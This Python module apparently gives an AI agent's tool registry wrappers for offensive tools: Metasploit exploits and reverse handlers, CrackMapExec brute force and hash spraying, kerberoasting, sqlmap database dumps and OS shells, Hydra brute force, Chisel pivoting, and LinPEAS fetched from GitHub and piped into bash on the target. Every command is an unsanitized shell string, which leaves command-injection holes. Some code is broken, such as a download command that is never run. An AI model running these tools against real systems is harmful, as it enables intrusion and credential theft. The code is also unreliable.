"""Enterprise Tools - Real enterprise pentesting tools integration."""

import asyncio
import os
from typing import Any, Optional
from dataclasses import dataclass

from ai.tool_registry import ToolCategory, register_tool, ToolParameter


@dataclass
class ShellResult:
    """Result of a shell command."""

    success: bool
    output: str
    error: str = ""
    exit_code: int = 0


class EnterpriseTools:
    """Real enterprise pentesting tools."""

    @staticmethod
    async def run_cmd(cmd: str, timeout: int = 300) -> ShellResult:
        """Execute a shell command."""
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return ShellResult(
                success=proc.returncode == 0,
                output=stdout.decode("utf-8", errors="replace"),
                error=stderr.decode("utf-8", errors="replace"),
                exit_code=proc.returncode or 0,
            )
        except asyncio.TimeoutError:
            return ShellResult(success=False, output="", error="Command timed out")
        except Exception as e:
            return ShellResult(success=False, output="", error=str(e))


class MetasploitIntegration:
    """Real Metasploit Framework integration."""

    @staticmethod
    async def search_exploit(keyword: str) -> dict:
        """Search for exploits using searchsploit."""
        cmd = f"searchsploit {keyword}"
        result = await EnterpriseTools.run_cmd(cmd)
        return {
            "keyword": keyword,
            "results": result.output,
            "success": result.success,
        }

    @staticmethod
    async def run_module(
        module: str,
        rhosts: str,
        lhost: str = "",
        lport: str = "4444",
        extra_options: Optional[dict] = None,
    ) -> dict:
        """Execute Metasploit module via msfconsole."""
        # Build resource script
        commands = [f"use {module}", f"set RHOSTS {rhosts}"]

        if lhost:
            commands.extend([f"set LHOST {lhost}", f"set LPORT {lport}"])

        if extra_options:
            for key, value in extra_options.items():
                commands.append(f"set {key} {value}")

        commands.append("exploit -j")  # Run as job

        # Create resource script
        resource_script = "\n".join(commands) + "\nexit\n"
        script_path = "/tmp/msf_resource.rc"

        with open(script_path, "w") as f:
            f.write(resource_script)

        cmd = f"msfconsole -q -r {script_path}"
        result = await EnterpriseTools.run_cmd(cmd, timeout=120)

        return {
            "module": module,
            "rhosts": rhosts,
            "output": result.output,
            "success": result.success,
        }

    @staticmethod
    async def reverse_handler(lhost: str, lport: int = 4444) -> dict:
        """Start reverse handler."""
        cmd = f"msfconsole -q -x 'use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; exploit -j'"
        result = await EnterpriseTools.run_cmd(cmd, timeout=30)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def list_sessions() -> dict:
        """List active Metasploit sessions."""
        cmd = "msfconsole -q -x 'sessions -l; exit'"
        result = await EnterpriseTools.run_cmd(cmd)
        return {"success": result.success, "sessions": result.output}

    @staticmethod
    async def execute_session_command(session_id: int, command: str) -> dict:
        """Execute command on Metasploit session."""
        cmd = f"msfconsole -q -x 'sessions -i {session_id} -c \"{command}\"; exit'"
        result = await EnterpriseTools.run_cmd(cmd, timeout=30)
        return {"success": result.success, "output": result.output}


class CrackMapExecIntegration:
    """Real CrackMapExec integration for AD attacks."""

    @staticmethod
    async def smb_enum(target: str, username: str = "", password: str = "") -> dict:
        """SMB enumeration with CME."""
        auth = f"-u {username} -p {password}" if username else "--null"
        cmd = f"crackmapexec smb {target} {auth} --shares --users --groups --pass-pol"
        result = await EnterpriseTools.run_cmd(cmd, timeout=60)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def smb_brute(target: str, usernames: str, passwords: str) -> dict:
        """SMB password brute force with CME."""
        cmd = f"crackmapexec smb {target} -u {usernames} -p {passwords} --continue-on-success"
        result = await EnterpriseTools.run_cmd(cmd, timeout=300)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def smb_hash_spray(target: str, usernames: str, ntlm_hashes: str) -> dict:
        """NTLM hash spraying with CME."""
        cmd = f"crackmapexec smb {target} -u {usernames} -H {ntlm_hashes} --continue-on-success"
        result = await EnterpriseTools.run_cmd(cmd, timeout=300)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def winrm_exec(target: str, username: str, password: str, command: str) -> dict:
        """Execute command via WinRM with CME."""
        cmd = f"crackmapexec winrm {target} -u {username} -p {password} -x '{command}'"
        result = await EnterpriseTools.run_cmd(cmd, timeout=30)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def smb_exec(target: str, username: str, password: str, command: str) -> dict:
        """Execute command via SMB with CME."""
        cmd = f"crackmapexec smb {target} -u {username} -p {password} -x '{command}'"
        result = await EnterpriseTools.run_cmd(cmd, timeout=30)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def ldap_enum(target: str, username: str, password: str) -> dict:
        """LDAP enumeration with CME."""
        cmd = f"crackmapexec ldap {target} -u {username} -p {password} --users --groups --computers"
        result = await EnterpriseTools.run_cmd(cmd, timeout=60)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def kerberoast(target: str, username: str, password: str) -> dict:
        """Kerberoasting with CME."""
        cmd = f"crackmapexec ldap {target} -u {username} -p {password} --kerberoast /tmp/kerberoast.txt"
        result = await EnterpriseTools.run_cmd(cmd, timeout=120)

        # Read hashes
        hashes = ""
        if os.path.exists("/tmp/kerberoast.txt"):
            with open("/tmp/kerberoast.txt", "r") as f:
                hashes = f.read()

        return {"success": result.success, "output": result.output, "hashes": hashes}


class BloodhoundIntegration:
    """Real Bloodhound integration for AD attack paths."""

    @staticmethod
    async def collect(
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        collection_method: str = "all",
    ) -> dict:
        """Collect AD data with Bloodhound."""
        cmd = (
            f"bloodhound-python -d {domain} -u {username} -p {password} "
            f"-dc {dc_ip} -c {collection_method}"
        )
        result = await EnterpriseTools.run_cmd(cmd, timeout=300)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def find_shortest_path(
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        target_user: str,
    ) -> dict:
        """Find shortest attack path to a target user via neo4j."""
        from enterprise.bloodhound_queries import connect_bloodhound, find_shortest_paths

        if not connect_bloodhound():
            connect_bloodhound(
                os.environ.get("BLOODHOUND_URI", "bolt://localhost:7687"),
                os.environ.get("BLOODHOUND_USER", "neo4j"),
                os.environ.get("BLOODHOUND_PASSWORD", "bloodhound"),
            )
        await BloodhoundIntegration.collect(domain, username, password, dc_ip, "session,group")

        paths = find_shortest_paths(domain, limit=5)
        return {
            "success": True,
            "target": target_user,
            "attack_paths": paths,
            "note": "Shortest attack paths from collected neo4j data.",
        }


class ChiselIntegration:
    """Real Chisel integration for pivoting."""

    @staticmethod
    async def start_server(
        listen_host: str = "0.0.0.0",
        listen_port: int = 8080,
    ) -> dict:
        """Start Chisel server."""
        cmd = f"chisel server --reverse --port {listen_port} --host {listen_host}"
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        return {"success": True, "pid": proc.pid, "port": listen_port}

    @staticmethod
    async def connect_client(
        server: str,
        server_port: int = 8080,
        local_port: int = 1080,
    ) -> dict:
        """Connect Chisel client and create SOCKS proxy."""
        cmd = f"chisel client {server}:{server_port} R:socks"
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        return {
            "success": True,
            "pid": proc.pid,
            "proxy": f"socks5://127.0.0.1:{local_port}",
        }

    @staticmethod
    async def forward_port(
        server: str,
        server_port: int,
        local_port: int,
        remote_host: str,
        remote_port: int,
    ) -> dict:
        """Forward a port through Chisel."""
        cmd = f"chisel client {server}:{server_port} {local_port}:{remote_host}:{remote_port}"
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        return {"success": True, "pid": proc.pid}


class LinPEASIntegration:
    """Real LinPEAS integration for Linux privesc."""

    @staticmethod
    async def run(
        target: str,
        username: str,
        password: str,
        output_file: str = "/tmp/linpeas.txt",
    ) -> dict:
        """Run LinPEAS on target."""
        # Download LinPEAS
        download_cmd = f"sshpass -p '{password}' ssh {username}@{target} 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash'"

        # Run LinPEAS
        run_cmd = f"sshpass -p '{password}' ssh {username}@{target} 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'"

        result = await EnterpriseTools.run_cmd(run_cmd, timeout=300)
        return {"success": result.success, "output": result.output[:5000]}


class SQLMapIntegration:
    """Real SQLMap integration for SQL injection."""

    @staticmethod
    async def test_injection(
        url: str,
        param: str = "",
        level: int = 1,
        risk: int = 1,
    ) -> dict:
        """Test for SQL injection."""
        cmd = f"sqlmap -u '{url}' --batch --level {level} --risk {risk}"
        if param:
            cmd += f" -p {param}"
        result = await EnterpriseTools.run_cmd(cmd, timeout=120)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def dump_database(
        url: str,
        param: str,
        database: str,
        level: int = 3,
    ) -> dict:
        """Dump a database."""
        cmd = f"sqlmap -u '{url}' --batch --level {level} -p {param} -D {database} --dump"
        result = await EnterpriseTools.run_cmd(cmd, timeout=600)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def get_shell(
        url: str,
        param: str,
        level: int = 3,
    ) -> dict:
        """Get OS shell via SQL injection."""
        cmd = f"sqlmap -u '{url}' --batch --level {level} -p {param} --os-shell"
        result = await EnterpriseTools.run_cmd(cmd, timeout=120)
        return {"success": result.success, "output": result.output}


class HydraIntegration:
    """Real Hydra integration for brute force."""

    @staticmethod
    async def ssh_brute(
        target: str,
        username: str,
        password_file: str,
        port: int = 22,
    ) -> dict:
        """SSH brute force."""
        cmd = f"hydra -l {username} -P {password_file} -t 4 -vV ssh://{target}:{port}"
        result = await EnterpriseTools.run_cmd(cmd, timeout=600)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def smb_brute(
        target: str,
        username_file: str,
        password_file: str,
    ) -> dict:
        """SMB brute force."""
        cmd = f"hydra -L {username_file} -P {password_file} -t 4 -vV smb://{target}"
        result = await EnterpriseTools.run_cmd(cmd, timeout=600)
        return {"success": result.success, "output": result.output}

    @staticmethod
    async def rdp_brute(
        target: str,
        username_file: str,
        password_file: str,
    ) -> dict:
        """RDP brute force."""
        cmd = f"hydra -L {username_file} -P {password_file} -t 4 -vV rdp://{target}"
        result = await EnterpriseTools.run_cmd(cmd, timeout=600)
        return {"success": result.success, "output": result.output}


# Register enterprise tools
@register_tool(
    name="msf_search",
    description="Search Metasploit exploits using searchsploit",
    category=ToolCategory.EXPLOITATION,
    parameters=[
        ToolParameter(name="keyword", type="str", description="Search keyword"),
    ],
)
async def msf_search(keyword: str) -> dict:
    return await MetasploitIntegration.search_exploit(keyword)


@register_tool(
    name="msf_exploit",
    description="Execute Metasploit module against target",
    category=ToolCategory.EXPLOITATION,
    parameters=[
        ToolParameter(name="module", type="str", description="Metasploit module path"),
        ToolParameter(name="rhosts", type="str", description="Target host(s)"),
        ToolParameter(name="lhost", type="str", description="Listener host", required=False),
    ],
)
async def msf_exploit(module: str, rhosts: str, lhost: str = "") -> dict:
    return await MetasploitIntegration.run_module(module, rhosts, lhost)


@register_tool(
    name="cme_smb",
    description="CrackMapExec SMB enumeration and attacks",
    category=ToolCategory.AD,
    parameters=[
        ToolParameter(name="target", type="str", description="Target IP"),
        ToolParameter(name="username", type="str", description="Username", required=False),
        ToolParameter(name="password", type="str", description="Password", required=False),
        ToolParameter(name="action", type="str", description="Action: enum, brute, exec"),
    ],
)
async def cme_smb(target: str, username: str = "", password: str = "", action: str = "enum") -> dict:
    if action == "enum":
        return await CrackMapExecIntegration.smb_enum(target, username, password)
    elif action == "exec" and username and password:
        return await CrackMapExecIntegration.smb_exec(target, username, password, "whoami")
    return {"error": "Invalid action or missing credentials"}


@register_tool(
    name="bloodhound_collect",
    description="Collect AD data with Bloodhound for attack path analysis",
    category=ToolCategory.AD,
    parameters=[
        ToolParameter(name="domain", type="str", description="AD domain"),
        ToolParameter(name="username", type="str", description="Username"),
        ToolParameter(name="password", type="str", description="Password"),
        ToolParameter(name="dc_ip", type="str", description="Domain controller IP"),
    ],
)
async def bloodhound_collect(domain: str, username: str, password: str, dc_ip: str) -> dict:
    return await BloodhoundIntegration.collect(domain, username, password, dc_ip)


@register_tool(
    name="chisel_pivot",
    description="Create SOCKS proxy pivot with Chisel",
    category=ToolCategory.PIVOTING,
    parameters=[
        ToolParameter(name="server", type="str", description="Chisel server IP"),
        ToolParameter(name="server_port", type="int", description="Chisel server port", required=False, default=8080),
    ],
)
async def chisel_pivot(server: str, server_port: int = 8080) -> dict:
    return await ChiselIntegration.connect_client(server, server_port)


@register_tool(
    name="linpeas_run",
    description="Run LinPEAS for Linux privilege escalation enumeration",
    category=ToolCategory.EXPLOITATION,
    parameters=[
        ToolParameter(name="target", type="str", description="Target IP"),
        ToolParameter(name="username", type="str", description="SSH username"),
        ToolParameter(name="password", type="str", description="SSH password"),
    ],
)
async def linpeas_run(target: str, username: str, password: str) -> dict:
    return await LinPEASIntegration.run(target, username, password)


@register_tool(
    name="sqlmap_test",
    description="Test for SQL injection with SQLMap",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="url", type="str", description="Target URL"),
        ToolParameter(name="param", type="str", description="Parameter name", required=False),
        ToolParameter(name="level", type="int", description="Test level (1-5)", required=False, default=1),
    ],
)
async def sqlmap_test(url: str, param: str = "", level: int = 1) -> dict:
    return await SQLMapIntegration.test_injection(url, param, level)


@register_tool(
    name="hydra_ssh",
    description="SSH brute force with Hydra",
    category=ToolCategory.EXPLOITATION,
    parameters=[
        ToolParameter(name="target", type="str", description="Target IP"),
        ToolParameter(name="username", type="str", description="Username"),
        ToolParameter(name="password_file", type="str", description="Password file path"),
        ToolParameter(name="port", type="int", description="SSH port", required=False, default=22),
    ],
)
async def hydra_ssh(target: str, username: str, password_file: str, port: int = 22) -> dict:
    return await HydraIntegration.ssh_brute(target, username, password_file, port)
